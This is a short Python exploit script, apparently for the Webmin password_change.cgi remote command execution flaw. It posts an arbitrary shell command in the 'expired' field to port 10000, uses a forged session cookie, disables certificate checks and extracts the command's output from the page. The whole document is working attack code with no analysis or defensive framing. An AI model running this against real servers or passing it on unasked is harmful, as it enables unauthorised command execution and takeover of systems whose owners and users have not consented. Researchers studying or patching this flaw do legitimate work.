# Author: https://github.com/HACHp1

import requests
import re

def execute_command(ip,cmd='id'):

    header={
        'Host': ip+':10000', 
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0', 
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 
        'Accept-Encoding': 'gzip, deflate', 
        'Content-Type': 'application/x-www-form-urlencoded', 
        'Content-Length': '52', 
        'Connection': 'close', 
        'Referer': 'https://192.168.153.128:10000/session_login.cgi', 
        'Cookie': 'redirect=1; testing=1; sid=x',
        'Upgrade-Insecure-Requests': '1'
        }

    data={
        'expired': cmd
        }

    url='https://' + ip + ':10000/password_change.cgi'

    res=requests.post(url,data=data,headers=header,verify=False)

    pat='Your password has expired, and a new one must be chosen.([^<]*)'
    return re.findall(pat,res.text)[0]

print(execute_command('192.168.153.128','id'))